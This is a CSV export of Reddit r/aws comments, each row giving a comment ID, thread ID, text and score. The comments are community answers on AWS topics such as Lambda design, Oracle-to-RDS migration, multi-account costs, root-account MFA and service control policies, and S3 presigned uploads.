g8dcjww,j7r0kv,On item 4 you don’t say that you are allowing outbound access from the ALB SG to the Fargate SG. It might be implied but just pointing it out.,1.0
g8dgckf,j7r0kv,I implied it as I would have to explicitly delete the outbound rule in order for that to happen...,1.0
g86l399,j7qnw4,AWS Organization? Auto accept is built in for member accounts when attached to an organization.,1.0
g86od76,j7qnw4,"Yes I am using organizations, i see I guess I would have to share via OU or organization wide.",1.0
g87ick4,j7qnw4,"You can share directly to an account as well. My guess is the checkbox to allow it is unchecked in the organization RAM console. This is the default configuration which mimics how accounts would behave as if they were still standalone.

Without the checkbox enabled, you'd still have to accept on a per account basis and I don't think you can share at the organization or ou level... Don't quote me on that.",1.0
g86yh4y,j7qzxe,You can either make a small lambda that will get triggered (not sure but you might have to have a proxy AWS queue subscribed to an SNS topic) or just have some file in S3 that tracks the version which can trigger it,1.0
g86kzh4,j7qv5f,"This is a problem with the configuration of the web server, not the DNS.",7.0
g86obbf,j7poz0,"Very generic question, maybe add some context. Lambda/API gateway could be a sugestion but it depends on your use case.",1.0
g86p3pq,j7poz0,Easiest is probably elastic beanstalk.   I'm a fan of fargate clusters though.,1.0
g86y52k,j7oxkf,"I'm not sure what you mean by big or small in this context. But here's some general free advice.

Buy yourself some flexibility by writing your code so you can do it either of those ways and change your mind about it later. If you're smart about your code, you can usually switch between one or several Lambdas by choosing a different handler from the same shared codebase.

On the whole caching thing, it's usually easy enough to cache your results. Cache invalidation on the other hand is tricky. DynamoDB can work. So can S3. Both are often pretty cost effective.",2.0
g878ebm,j7oxkf,"All the handlers in 1 lambda, of course, a 3rd option!
What I meant with one big lambda is that I'd have 1 call to dynamoDB to retrieve the data followed by, lets say, 13 different async functions running in parallel to parse the data to the desired output for the graphs.

or, I can split those 13 async functions into their own respective handlers, but that would mean I have 13 times a dynamoDB query.",1.0
g880hrn,j7oxkf,What's the worst that could happen by picking the simplest option and seeing how it goes? This should be low risk as long as your decision is reversible. :),2.0
g8fv5z8,j7oxkf,"So you can do several things: if the functions are small/quick and only going to be used once, just have it in a single lambda. 
If the functions are reusable and serves a specific output that you might need in other lambdas AND they are not like 5 lines of code, create a lambda for it. 
If the functions a short and reusable across your platform, make a module with util functions that you import as a layer.
We utilize a variation of this and it works great.",1.0
g8gt92h,j7oxkf,"Utils in a layer, another design choice to think about haha. Thanks, I'll keep it in mind.",1.0
g863du2,j7o47b,"if the source and destination DBs are both Oracle, why not expdp/impdp?  That's how we migrated all of our Oracle premise to AWS.  500GB isn't that large assuming you have a fast connection to the Internet to push the data up to the cloud.

[https://d1.awsstatic.com/whitepapers/strategies-for-migrating-oracle-database-to-aws.pdf](https://d1.awsstatic.com/whitepapers/strategies-for-migrating-oracle-database-to-aws.pdf)",3.0
g895n1h,j7o47b,"Thanks! In the documentation link, it says it’s for databases up to 10 GB. Were your databases larger than this? Also did you have to set up schemas in the aws rds database or does impdb do it all for you?",1.0
g8aaeq9,j7o47b,"The 10G limitation is for the 'old' exp and imp utilities.  I'm referring to Oracle Data Pump (expdp/impdp) which this doc says is good for up to 5TB.

We've used this method for up to 2TB databases.

We create empty schemas and let impdp create tables, sequences, indexes, etc.",1.0
g8abpzr,j7o47b,Thanks for the advice. Really appreciate it.,1.0
g86mpvz,j7o47b,If you’re wanting to replicate the live DB to AWS for some period of time before cutover DMS would be a good option. It’s pretty easy to setup and free for a period of time for migration to AWS so why not just try it and see how it goes?,1.0
g895sq9,j7o47b,Not wanting to replicate the database post migration. Just wanted to see if aws native tools can do a full load properly for peoplesoft oracle database. Mainly because I’m not too familiar with oracle based tools!,1.0
g88iinn,j7ngkb,Thanks a lot Jeff ! ;),2.0
g894vbc,j7ngkb,I've actually got some work coming up that's going to be dealing with new cache clusters.  This should be helpful!,1.0
g85x42x,j7kgkk,"Most of the security stuff is volume based. So it shouldn't make a difference if it analyzes many small accounts or everything in one big blob of account. Just check the pricings of each tool you want to implement.

Cost drivers in multi-account strategy are more the hourly priced services like NAT gateways, Transfer Gateway attachments, VPC endpoints, etc",1.0
g86wgzo,j7kgkk,"This is my feeling too.  Centralizing our Networking and using VPC sharing has made most of those negligible as well. So I’m really hunting for this magic cost driver that I might have missed. 

We are seeking to build the capability of ‘use 10k accounts if you want’ but cost is also a scalability factor now and that’s one that can’t be argued or accepted.",1.0
g87574e,j7kgkk,"Security hub doesn't cost scale   

https://aws.amazon.com/security-hub/pricing/

```
Example 3: Very large organization
Pricing dimensions:
3 regions, 200 accounts
1,000 security checks per account/region/month
50,000 finding ingestion events per account/region/month
Monthly charges =
1,000 * $0.0010 * 3 * 200 (first 100,000 checks/account/region/month)
+ 10,000 * $0 * 3 * 200 (first 10,000 events/account/region/month)
+ 40,000 * $0.00003 * 3 * 200 (over 10,000 events/account/region/month)
= $600 + $720
= $1,320 per month
```
double the accounts, double the price basically",1.0
g85tkrl,j7kgkk,"Security stuff - organization wide and organizational unit based service control policies. 

https://aws.amazon.com/blogs/security/how-to-use-service-control-policies-to-set-permission-guardrails-across-accounts-in-your-aws-organization/",1.0
g8755ds,j7kgkk,"I can't find pricing on these, why are they a cost driver?",1.0
g87gdid,j7kgkk,You said the biggest concern was “security stuff”. I was addressing that. There isn’t any cost to setting up multiple accounts.,1.0
g87h5wu,j7kgkk,"No that isn’t correct as account sprawl grows, certain aspects of AWS don’t scale well from a cost perspective. ‘Security stuff’ and to be specific security hub is one such example of things that don’t scale well with account numbers. 

Accounts themselves are ‘freeish’ but if your VPC model and compliance requirements are not thought about they can be an absolute money vortex in a highly regulated environment.",1.0
g85v2x9,j7kxan,"These aren't the only 2 options.

We don't use the root account, nor do we use IAM users. We use SSO to assume roles.",8.0
g861unq,j7kxan,...with MFA for “Admin” roles,1.0
g86gq8n,j7kxan,SAML federation so neither.,2.0
g88ldpz,j7kxan,"We have around 120 AWS accounts. We have our oldest “legacy” accounts where we use SAML and role-assuming (via `aws-okta`). Most of the rest accounts, however, we use an IAM user with session credentials (via `aws-vault`).",2.0
g88o5zr,j7kxan,Thanks. That’s the kind of insight I am looking for,1.0
g85ta1q,j7kxan,"Neither, I don't allow ssh on my systems.  Administer the systems via IAC.",-2.0
g85tq0s,j7kxan,The OP is referring to the AWS account root user. Not an OS root user in Linux/Windows.,2.0
g85tsuu,j7kxan,Ignore me.. Still neither then.  I use an assumed role :),2.0
g863xrz,j7k98m,"Billing can be 24 hours out for showing up in your account. Check tomorrow if it is still accruing. Either way, open a support case for billing to get this resolved.",2.0
g87c91o,j7k98m,I think you're right and the problem has been solved. Thanks for help!,1.0
g85mdbn,j7m9ba,"S3 + CloudFront for static content, it's awesome.  No web servers to patch or maintain and will handle it without needing to worry about scaling.",6.0
g85ln4p,j7m9ba,"Is your web content static, or dynamic? If it’s dynamic choose EC2, if it’s static you could get away with S3",2.0
g85mebo,j7m9ba,Well that's easy enough. Is there a reason for that or just best practice?,1.0
g85nxbe,j7m9ba,"I'm not the original commenter, but I'll respond anyway.

This is just best practice with regards to AWS. Static content is best served via CloudFront with S3 as a CloudFront origin, as these two go very well together.

EC2 (or alternatively Lightsail if your workload isn't too intensive and you prefer pricing for instances similar to that of DigitalOcean, Linode, Vultr, etc.) for dynamic content since you'll likely need compute resources for your backend.

An alternative to EC2 is API Gateway in combination with AWS Lambda. This would only work if your dynamic content can be worked to fit a serverless workflow, but can be a viable option for some scenarios.",3.0
g85p8aw,j7m9ba,"Thanks for filling in. I was going to mention LightSail, it’s great for ease of use if you’re not used to AWS.",2.0
g85r3if,j7m9ba,"Awesome, thanks for the context. Looks like I've got some new things to learn about!",1.0
g86t8ce,j7m9ba,"I agree with other posters that S3 + CloudFront is great for static sites.

But you shouldn't shy away from S3 + CloudFront even if you do need some backend features or authentication, since it's not difficult these days to add some basic API/DB functionality with AWS SAM CLI.

I'm not sure EC2 provides many advantages over S3 + CloudFront for most full stack sites these days, either.

(For a quick way to get static sites or JavaScript apps (Angular, React) to S3 + CloudFront with Custom Domain and SSL, you can check out our Open Source tool, Parima: [https://github.com/formkiq/parima](https://github.com/formkiq/parima))",1.0
g884h8a,j7m9ba,"Probably beyond the scope of what you're doing in terms of training yourself, but looking into CI/CD + Docker + ECS would be the cool, modern way to deploy web apps.",1.0
g85x93s,j7m2ju,This is what AWS Consulting Partners are for.,1.0
g85tpby,j7m2ju,What do you need that your Business Support Plan doesn’t give you? What are some issues you are having?,1.0
g85jzfi,j7lzlr,"Just use DynamoDB with on-demand pricing. Your data doesn't need a relational DB.

Update to provisioned capacity (eventually with autoscaling) if your read workload has a consistent baseline.",3.0
g85kg06,j7lzlr,does that mean that my cost could be higher than the rds if i am writing potentially hundreds of times a second (per api call of my service to write a row) and a read (to read user data)? or does rds also have per use costs,1.0
g85kmet,j7lzlr,"Depends on your application, batch read/writes etc. But itay be comparable, because if you have such high loads then you would also need to upscale your RDS instance.",1.0
g85l0gd,j7lzlr,okay I’ll check our dynamodb as I’m not familiar with it but have heard a lot of it. thanks!,1.0
g86oojv,j7lzlr,"Someone mentioned dynamo.  But if you want to stick with SQL, aurora serverless is also an excellent option.",1.0
g88033v,j7lzlr,Lambda cold starts are bad enough and then add Aurora Serverless slow starts? Aurora Serverless is also more expensive if it is always running. I have not yet found a good use case of Aurora Serverless in a production environment.,3.0
g85m34p,j7lpa2,"Aws model for locking down root accounts is fully broken with their push to a multiaccount approach. How can I reliably setup root 2FA for 80 accounts that I setup in 2 days? We just disable root with SCP, it’s not feasible, the error chance is too high.",12.0
g85thmb,j7lpa2,Not sure why you got downvoted. 100% agree and we do the same with SCP. Now we only have to manage 1 root user MFA. AWS needs to eliminate root user...the time has come.,3.0
g86lfzj,j7lpa2,"How do you use an SCP to block password reset via the ""Forgot Password"" email token method? https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys_retrieve.html#reset-root-password

I have an SCP which denies all actions on all resources using a condition that the principal ARN is like ""arn:aws:iam::*:root"", but resetting the root password using the above method still works.

    {
        ""Version"": ""2012-10-17"",
        ""Statement"": [
            {
                ""Sid"": ""DENYALL"",
                ""Effect"": ""Deny"",
                ""Action"": ""*"",
                ""Resource"": [
                    ""*""
                ],
                ""Condition"": {
                    ""StringLike"": {
                        ""aws:PrincipalArn"": [
                            ""arn:aws:iam::*:root""
                        ]
                    }
                }
            }
        ]
    }",2.0
g86w61x,j7lpa2,"Yeah that is indeed true. So the account is not entirely useless and the mail assigned to the account needs to be looked after. Pretty annoying. I didn’t yet look at alerting on that event, I guess it’s possible.

It really should be fixed.",2.0
g86zvbm,j7lpa2,"Yeah so my concern is that this SCP alone is insufficient to secure the account. Once someone gets in this way, they could close the account or do some other action which isn't controlled by IAM permissions.

I mean, sure, make sure the mailbox is secure. But if you've got multiple AWS accounts you've probably got the email addresses for them pointing at some sort of shared mailbox.",1.0
g874tlz,j7lpa2,"I believe the account actions still available are 'shutdown request' and 'change password'   


obviously a shutdown request isnt.... super handy.",1.0
g85t12r,j7lpa2,"Yeah, feel like we must end up with some organisation level root process surely?",1.0
g85kgnr,j7lpa2,"Yeah, still waiting for it too.

In the meantime I used the virtual MFA device and saved the TOTP on multiple yubikeys for resiliency. Of course the yubikeys have limits on the TOTP tokens it can save, but it's OK to utilize multiple ones.",3.0
g85tgvl,j7lpa2,"This is interesting, thank you, something to think about...",1.0
g85w2n5,j7lpa2,Only way I got to have multiple MFA devices for each root account and being still hardware based,1.0
g85uf29,j7lpa2,"We use virtual MFA, print multiple copies of the bar code, and keep the printouts in safes.  The people holding the safes do not have access to the passwords making a ""2 key missile launch system"" to log in as root. ie at least two people need to be aware of a situation requiring root access; A person with access to the passwords, and a person with access to the safe.

There are flaws in the process though as we have to trust that the person who sets the password and MFA initially, deletes the MFA token from their device.",3.0
g873271,j7lpa2,"This is how we worked, we didn’t have access to the safe, and had to ask someone who would log it. Trouble is when you don’t have someone else to do that at home!",1.0
g874vtv,j7lpa2,"and if you spawn 60 accounts out in a day, how do you trust the person doing that manual tedious process, actually did it correctly at all? Sounds like a 4 eyes situation that could go really wrong.",1.0
g85jhew,j7lpa2,"You'll likely have to make a feature request to AWS for them to enable accounts to have multiple MFA methods, and then hope that they receive enough input from customers to make this a feature.

As far as I can tell, neither IAM accounts nor Root accounts can have more than one MFA device attached to it; in other words, **only** one Virtual MFA Device (i.e., Google Authenticator) **or** one YubiKey **or** one 'other' hardware-MFA device (think of those physical key fobs that generate those 6 number OTPs; yes, they're still in use today despite the fact that many people (based on my observations, anyway) think they're old and deprecated tech). This applies to all accounts within the regular `aws` partition (if you look at one of your ARN sand it looks like `arn:aws:dynamodb:us-west-2:123456789123:resource\_id`, then you're in the regular `aws` partition).

I cannot speak for AWS China or AWS GovCloud, as I do not (and, for that matter, cannot) have accounts in those partitions (I don't operate in China, and I don't do work with the U.S. Government). If anything, it is entirely *possible* that GovCloud could allow multiple MFA devices, especially given the tighter data security policies the U.S. Government would want AWS to follow, but I also somewhat doubt this since regular accounts don't have it.",2.0
g85tq5m,j7lpa2,"They did create a feature request for me, but you know how opaque they can be, no idea of the interest. It does feel backwards with resilience, when you consider AWS is basically the home of resilience.",1.0
g85luq2,j7lpa2,"Everyone has the same problem (presumably).

We use virtual MFAs instead and share them to multiple people who control it via Authy.",1.0
g85t5xl,j7lpa2,How are you sharing with Authy? We use Authy for our non root accounts and google etc.,1.0
g85ygw6,j7lpa2,Authy allows device sharing of MFA tokens by registering multiple times to the same phone number.,1.0
g85pu4d,j7lpa2,In the short term perhaps you could use a safe deposit box at a bank or specialist provider,1.0
g86iryi,j7lpa2,"I thought the root account in an organization by default was disabled by virtue of not having a password attached to it.  

So why not monitor for password resets and logins on the root account and just leave them as is?",1.0
g86jm3p,j7lpa2,"The master org account would be setup, otherwise how would you get IAM on the original account setup?

EDIT: It makes sense too, root is a good ""break glass"" user if everything else goes to shit",1.0
g86kpwk,j7lpa2,"Sorry, yeah I wasn't clear.

The root account in an organization would be active.  It's the root accounts for subsequent accounts that are disabled as creating an account via organizations automatically creates roles you can assume.",2.0
g873d1j,j7lpa2,"The root account isn't disabled, the password is just ""unknown"". Anyone with access to the email address used to create the account can reset the password and log in via root.  Unless you can guarantee that that mailbox is hacker proof (hint: you can't) you should preemptively be logging in as root, enabling MFA and securing the MFA tokens.",2.0
g87o8rh,j7lpa2,"&gt; Anyone with access to the email address used to create the account can reset the password and log in via root.

Right, but a single root mailbox with a strong password and MFA on it is a lot more scalable than 100 root accounts with individual MFA.  That's going to lead people to saving the MFA initiator code somewhere, or sharing a virtual MFA like authy to multiple people, which is not secure either.",2.0
g874yy3,j7lpa2,yeah disabling the root account plus 'loud noises' if a reset is requested seems about as 'scaleable as it will get' for the time being.,1.0
g86w4u7,j7lcbe,That's neat.,1.0
g85eij6,j7l9b1,"You can trigger a lambda function everytime a new object is added to s3. 

https://docs.aws.amazon.com/AmazonS3/latest/dev/NotificationHowTo.html",2.0
g85rtae,j7l9b1,"Ah thanks! We are using S3 trigger to update Glue Catalog i believe.

I was hoping there was some way to do it on Firehose stream, I couldn’t find any documentation it, maybe its not possible.

(Sort of like how you can do it on Kinesis Delivery Stream)",1.0
g85hlax,j7l9b1,"Why wouldn’t you use Kinesis Data Analytics?  If I’m understanding your use case correctly, it seems like a good fit.",1.0
g85uxeu,j7l9b1,"The lambda function would write to MongoDB Atlas, i believe analytics (correct me if i am wrong here) just transforms data using sql and stores it in other table?",1.0
g85vvpr,j7l9b1,"Is there maybe another tool i can use instead?

Something like SQS or Kinesis Delivery Stream? Which can call multiple Lambdas then send the data to Firehose?

I saw some articles about people using Firehose Data Transformation to call lambdas. If a data transformation lambda fails, will the data still make it to S3?",1.0
g86rgmz,j7l9b1,"Yes, Lambda can act as an event sink for Kinesis Data Streams, and I believe can also be linked directly to a Kinesis Firehose Delivery Stream, but that's typically a bit more complex/limited.

You can always have Firehose deliver to Redshift, S3, or Athena/Glue/S3, and process from there? Best solution depends heavily on the use case though.",1.0
g855fq4,j7jx08,"You can use route53 to redirect traffic to a custom page when all instances behind an elb are failing health checks

Or

Use cloudfront to serve your application and use custom redirects",2.0
g85v70r,j7jx08,"This is the approach I'd recommend as well. Best coverage with the least number of moving parts. If the the site behind the ALB _or_ the ALB itself failed for some reason, the route53 failover should kick in.",1.0
g89ey35,j7jx08,Can you share some tutorial on how to do this ? I'm a noob.,1.0
g859swn,j7jx08,"Even if you could replace the 502 page I wouldn't recommend it. Troubleshooting might get confusing. 

But one way to accomplish this is to use a lambda function as an ALB target. The lambda can return the custom maintenance page. 

You would then have some temporary redirect rule that directs all traffic to the lambda that you could add or remove manually, or automate it using cloudwatch alarms or something.",1.0
g85e6j6,j7jx08,How can i force traffic to be redirected to the lambda function when servers on EC2 target instances are down. (502 bad gateway error),1.0
g895v9i,j7jx08,"You can set a default rule with a static respond on load balancer when certain conditions are met. 
I haven't looked at doing this on 502 and it certainly wouldn't work if the Load balancer goes down, but if the service was down, it could work.",1.0
g89eyro,j7jx08,Can you share some tutorial on how to do this ? I'm a noob.,1.0
g89j9ce,j7jx08,"The aws documentation is pretty decent. 

https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-elasticloadbalancingv2-listenerrule-fixedresponseconfig.html",1.0
g84zawx,j7iht9,"it's basically impossible to reaccess the computer if you lose the key pair.   


HOWEVER you can ""take the hard drive out"" and put it in another computer and unless they did specific things with encryption you'll be able to just use it just fine.",3.0
g84x8u8,j7iht9,"That's pretty much it, you have to create a new one and mount the old one.",1.0
g866ued,j7iht9,"If the VM was mounted on an EBS volume, you can mount that EBS volume as a secondary drive on a newly spun up Windows machine that you have access to. Mount the drive and copy the data off it.
You can also snapshot EBS volumes to S3 and generate a new EBS volume from the snapshot if you don't want to mess with the existing setup.",1.0
g85mgv5,j7ifu3,I read an article sometime about doing default indexes for subdirectories by using Lambda@Edge to rewrite the request URL and add the /index.html.,2.0
g84un2l,j7ifu3,Did you change the base path of each app to match the url?,1.0
g84y6cw,j7ifu3,"So that is a good question, currently my baseHref is set to the specific subdomain i.e. /app1/ or /app2/, should each app have the FQDN as the baseHref instead of just the path?",1.0
g854v1u,j7ifu3,I think your angular app shouldhave a configuratednbase path to match that. If that is still not working I don't know,1.0
g85kzux,j7hj9e,Use AWS SSO. With AWS SSO you can deoy your defined roles to every account in your organizations with full access.,3.0
g84qrug,j7hj9e,"Ideally you should not use the root account unless absolutely necessary, think of it as a super user account. What you should do is create a the account and invite yourself and give yourself root access basically making yourself as the admin. Then login from your account and invite others and give them the appropriate access.",1.0
g84tru9,j7hj9e,Thank you!,1.0
g84y0id,j7hj9e,"Like you put an MFA on it, lock it away in a safe, and neeeever ever touch it.",1.0
g85u29i,j7hj9e,Eh...gotta touch it sometimes to ensure it still works. Maybe twice a year with a well defined process around pulling it out to test it.,1.0
g85euiy,j7hzmp,What do you mean by SDK? An SDK is bundled into an application. Do you mean CLI?,1.0
g862m08,j7hzmp,"You can safely remove the SDK, it won’t affect communication between AWS and the instance itself. 

You mention PowerShell - performing a full uninstall of the SDK will also do an uninstall of the AWS Tools for PowerShell module that’s preinstalled, so if you’re using cmdlets from the AWSPowerShell module, you might want to limit the uninstall. Doesn’t sound like you are though.",1.0
g85gpb9,j7gqsy,I feel like Fargate and Lamba are converging on each other. . .,23.0
g86xojn,j7gqsy,If only fargate started up as fast as lambda functions...,3.0
g87su8s,j7gqsy,If only Lambda functions ran for longer than 15 minutes. . .,4.0
g88a7ng,j7gqsy,Indeed :P,1.0
g84v36s,j7gqsy,Is my understanding right in that this is kind of like aspect oriented programming but for Lambda functions?,10.0
g8589dk,j7gqsy,"Yeah, that sounds like a good comparison. If you look at the [Extensions API](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-extensions-api.html) you can see all the hook points.",3.0
g8543ap,j7gqsy,"If the extension runs in the same execution environment as the function and uses the same resources, how is this different than what we have previously in Lambda Layers?

What would be really great is having a shared execution environment Lambda for any other Lambda you want to connect to it. I realize this is starting to run against the idea of decoupled serverless functions, but having the option would still be pretty damn powerful. You would get n shared environments (in presumably another Lambda) that could do things like hold database connections and somehow magically share that state with other functions that can still be independently deployed.",8.0
g85f0jo,j7gqsy,"Previously, Lambda layers wouldn't allow you to buffer data across invokes. Lambda extensions allows you do this and reliably egress data with the shutdown hook.",14.0
g85muzy,j7gqsy,Cool I didn’t realize it wasn’t like that before. Appreciate it.,3.0
g866jd2,j7gqsy,The blog notes that some extensions run external to the lambda execution an can persist across executions.,4.0
g84wx3f,j7gqsy,Is this basically allowing alternatives to the aws console/cloudwatch logs?,10.0
g84ylyc,j7gqsy,"Seems a fair bit different, feels like they are allowing the deployment of something similar to a sidecar design in container world.  In addition the sidecars can be long running and have visibility into every function innovation..

So they can probably support things like AV/ workload protection etc.  Feels like a play to allow a new marketplace for traditional vendors in serverless who were previously losing market share as no one felt the need to use those services in lambda.",16.0
g85g4kt,j7gqsy,Sidecarless.,21.0
g852om2,j7gqsy,"ya, seems closer to sidecars, or a layer that starts before the runtime and can edit it. you could use a sidecar to read logs and forward them somewhere else though. the biggest trickiness vs a regular sidecar is it seems to block returning a response from the lambda, it doesn't run if the function is frozen",7.0
g854g8t,j7gqsy,"To an extent, yes. You will likely be seeing AWS competitors releasing Lambda extensions soon that allow you to onboard their cloud infrastructure as an alternative to AWS.

Lambda extensions also gives you more visibility in your Lambda functions. [Amazon CloudWatch has released a Lambda extension _and_ accompanying managed dashboard](https://aws.amazon.com/about-aws/whats-new/2020/10/announcing-amazon-cloudwatch-lambda-insights-preview/) so you can easily onboard and improve your monitoring within the AWS infrastructure.",8.0
g85gl5e,j7gqsy,"I mean, AWS is walking a thin line here as they have been for a long time. If they throw a bone like this to third party vendors, they won't be as terrified.

Look at TimeStream. . . that's basically an Influx (and friends) killer. I really love AWS in general but goddamn, they're as scary, if not more so, than Microsoft was in the 2000s.

Why build anything on AWS when they can just copy and squash you overnight?",1.0
g85psem,j7gqsy,"Open Distro for Elasticsearch, anyone? 

Not saying it's related but [the timing is interesting](https://www.reuters.com/article/us-usa-tech-antitrust/u-s-houses-antitrust-report-hints-at-break-up-of-big-tech-firms-lawmaker-idUSKBN26R0EK)",2.0
g864yez,j7gqsy,"The way I see it is the more competitors, the better it is for customers.
While TimeStream competes with Influx, we don't know if it will kill the project. It can rather spur innovation we have not yet seen yet.",2.0
g87goh0,j7gqsy,I think as long as you are not on the infra side you are safe,1.0
g872d6o,j7gqsy,Would this give us the capability to close database connections when the lambda shuts down?,4.0
g84rvgf,j7gqsy,Nice.,12.0
g84wy1d,j7gqsy,Nice.,7.0
g84xizf,j7gqsy,Nice.,7.0
g851luk,j7gqsy,Nice.,3.0
g855tzk,j7gqsy,Nice.,6.0
g85t1ul,j7gqsy,Nice,1.0
g85thvd,j7gqsy,Nice,-3.0
g85toe3,j7gqsy,[deleted],-3.0
g85x1mm,j7gqsy,nice,-2.0
g85zfet,j7gqsy,Nice,-3.0
g868omi,j7gqsy,nice,-6.0
_,j7gqsy,,
g87hwdx,j7gqsy,"Hmm at a glance it looks like you still cannot proxy the runtime's handler with a layer/extension? That's the only thing I was waiting for really, effectively middleware but your extension has the choice whether or not to handle the event, or pass it on to the runtime.",2.0
g857ch2,j7ghjv,"Im still not able to understand what difficulty you having. Maybe you want to store that value somewhere? Like using ssm parameters. 

Or maybe it depends on the db you are using?
Sorry i couldnt be of much help",1.0
g874ulm,j7ghjv,Basically I want my lambda function to have acces to my db. Is there an aws of doing that?,1.0
g8755ze,j7ghjv,Where is your db stored? S3? Dynamodb? Rds? Is it a mysql db ? On premise? On an ec2 instance?,1.0
g875dli,j7ghjv,"I hope this helps

https://docs.aws.amazon.com/lambda/latest/dg/services-rds-tutorial.html",1.0
g84knz0,j7evs7,"Just activate API Gateway Logs and be happy. https://docs.aws.amazon.com/apigateway/latest/developerguide/set-up-logging.html

And from CloudWatch Logs you can store them in S3 for long term usage",3.0
g84c9ja,j7evs7,"Use ECS and deploy there your Api, for a high load or big request rates Api Gw will cost more to you as it is now.

Will be even better to go with ALB+EC2 you can tweak instances there to have as much as you need by autoscaling",0.0
g84qez2,j7f5jj,I don’t think route 53 supports privatelink yet so may need to use a NAT,2.0
g868den,j7ei2d,"If it's Neptune for example, you can subscribe in the RDS console to send yourself updates for a number of scenarios. Otherwise, you could use a Lambda to listen for events or create your own SNS topic with a filter to get updates.",1.0
g86g0a0,j7ei2d,"Use systems manager, maintenance window and execute runpatchbaseline install",1.0
g845g12,j7eb89,"Absolutely nothing, except you and whatever you have set up in advance. Well, you do get AWS Shield (standard level) for free and there are some other helpful things built in. But don't just rely on those; protect yourself.

Set up billing alerts. Both by specific $ threshold, and by anomaly detection. Do it now. Seriously, skip the rest of this thread and go do it now.

... now you're back, you can set up a Lambda that is triggered by the billing alert. This Lambda function will do whatever actions are needed to lock down your account to stop further access. Locking down access permissions, shutting down EC2 instances, blocking public access to S3 instances, disabling CloudFront distributions, and so on.

I appreciate this is not perfect. But it's better than manually responding to a massive usage spike, and it's definitely better than nothing.",8.0
g842l7g,j7eb89,Nothing.,4.0
g84qzgm,j7eb89,What AWS service are you referring to S3?  If S3 if your bucket is public or your security is set to authenticated user - Yes then nothing.  But non-public access and an S3 bucket policy is one way to prevent that,1.0
g84wufc,j7eb89,"By default, no one can download anything from your account.  So it really depends on what you setup to start with.

AWS shield, AWS WAF, and cloud front all exist and can be used to cache and protect underlying resources.

For large files, you can use pre-signed urls to s3, with built in short-lived timeouts, so your window of vulnerability is relatively small.

There are DDOS protections built into AWS shield and AWS WAF.

Depending on what you have setup, you can set concurrency limits on lambdas.",1.0
g84829u,j7cwx0,"When I prepared for this test (few month ago), I failed all this kind of tests too, because they full of wrong answers. Don't let them down you. Good prepare is the key. Read questions carefully, they full of tricky words.",2.0
g840920,j7cwx0,reschedule until you feel more comfortable,1.0
g842x7u,j7cwx0,"The practice tests I took for my developer certification were pretty spot-on with what was on the certification test. If you don't feel comfortable with the material, you should reschedule until you do. There are plenty of resources available for prep online, A Cloud Guru is a great example.

&amp;#x200B;

No need to waste your time and money taking an exam you aren't comfortable about passing.",1.0
g83usyw,j7bypr,"I would check first the:

 `$command = $client-&gt;getCommand('GetObject', [` 

and change to:

 `$command = $client-&gt;getCommand('PutObject', [` 

  
Then You are creating a presigned URL for uploading a ""video/mp4"", are you sure about the type of the file you're trying to upload? They need to match.

Same is for "" 'x-amz-acl': 'public-read' "", I think you should add this header in the function for creating the signed URL too.

Lastly, check if your credentials are allowed to do the action on the bucket, eg. PutObject

Let me know if this helps and good luck :)",4.0
g8417ko,j7bypr,is the IAM credential granted encrypt permissions for the S3 bucket key?,1.0
g84f5r0,j7bypr,Could be because public read. Do you have a public access block on the bucket? It's on per default.,1.0
g858oho,j7bypr,How big is the file?,1.0
g83k9t9,j7azky,"The premise of the article is flawed. All the guardrails that the author wants for resources to be created secure-by-default, and warnings about insecure configurations, are already there... if you create these through the web console.

Surely we can assume that someone doing this stuff programatically through the CLI or CloudFront has thought about what they are doing? And that going for the ""power user"" interfaces they'll want to interface to get out of their way asap and give them exactly what they asked for?

A good interface should be relevant to the needs of its users. This is more balanced toward safety for beginners, and more efficiency for experienced.",6.0
g876ep6,j7azky,"From years of reviewing code, I can tell you that this is a dangerous assumption to make. Developers of all skills make mistakes, and when security isn't enabled by default, it's easy for controls to be forgotten about when they're not the primary focus of the task at hand, then the holes left behind not discovered until it's too late.

Using a CLI or CF template to provision resources no more implies somebody is a ""power user"" (whatever that is, in the context of cloud computing) than using the web console implies the user is a novice, especially with the proliferation of cut and paste scriptlets available online.

The default behaviour for any interface *should* be secure by default but provide switches to open up on demand. The web UI for S3 follows this principle these days (although it didn't originally). The API, CLI, CF and friends are not secure by default for S3 (although are for most other, newer services) because of backward compatibility concerns. 

Ideally, a new S3 API would be promoted and locked down, with the old version gradually deprecated, but given the age of S3 and the difficulty of deprecating interfaces for it (see the path deprecation plan) this could take a while though.",2.0
g87cwls,j7azky,"I agree that using the CLI or CF is no guarantee that the user actually knows what they are doing. And 'Secure by default' is definitely the right way; no disagreement there. 

I'd argue that we should treat users as adults rather than children. Allow them to make an informed decision, but to be aware that ultimately they are responsible for their actions. Sure, the starting point for a service should be deny-by-default, with the user explicitly whitelisting allowed actions. But if they don't actually understand what they are doing, they will still whitelist too much, or just allow-all everything in order to make the irritating warnings go away and for their service to 'just work'.

If someone is blindly cargo-culting a snippet they found in some random blog, well, that is not going to end well. That random snippet might take a secure-by-default service and open up every feature and access point, to everyone on earth and beyond, leaving that user exactly where they were before. Insecure, and with no idea of their risk profile and exposure. You can't solve that with a default configuration.

My point about CF vs web console is analogous to power tools vs hand tools. You don't give a beginner a full workshop of power tools; they will lose fingers and arms within minutes. But if you make the guardrails too burdensome, the skilled pros will end up disabling them to stop them getting in the way, and then they will end up losing a finger eventually. 

CF should deploy exactly what I have told it to; nothing more, nothing less. I am responsible for defining this, as only I can define what my app is doing and what my acceptable risk profile looks like.",1.0
g83jcgt,j7azky,How do you know that it isn’t?,2.0
g83koof,j73m8u,You say its random. Could it be an instance issue? Have you checked cloudwatch logs?,2.0
g84mcmm,j73m8u,What's the actual error? Could you be seeing DNS queries fail?,2.0
g85l43j,j73m8u,"Can you launch an ec2 instance in that subnet, and ssh into it from another subnet and then do normal network troubleshoot?

It really does sound like an SG/NACL/Route issue, but getting on the instance and just pinging/curling/dns lookups may help you to understand  what's up.",2.0
g83kz81,j753h1,"If you have minimal experience working with AWS/cloud in general, start with Cloud Practitioner",5.0
g83l9dq,j753h1,"Hard to say without more information about your background. Are you an engineer? Are you a project manager? I think if you come from a technical background you won't need the practitioner.

When I (Software Developer) started with AWS services, I did the solutions architect associate and it was no problem.",2.0
g83sqf9,j753h1,You may as well go CCP. Good practice for the exam system if you go on to the higher level certs.,1.0
